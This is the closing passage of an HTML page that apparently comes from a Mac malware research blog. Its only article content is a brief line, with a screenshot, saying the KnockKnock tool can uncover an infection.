<p>Or a tool such as <a href="https://objective-see.com/products/knockknock.html">KnockKnock</a> can also uncover the infection:
<br>
<br>
<img src="../images/blog/blog_0x51/knockknock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>\</p>
<div class="note">
<center>
❤️ Love these blog posts and/or want to support my research and tools? 
\
You can support them via my [Patreon](https://www.patreon.com/bePatron?c=701171) page!
<p>&hellip;or better sign up for our <a href="https://objectivebythesea.com/v3/training.html">&ldquo;The Art of Mac Malware Analysis&rdquo;</a> class at Objective by the Sea v3.0!
\</p>
</center></div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>
</html>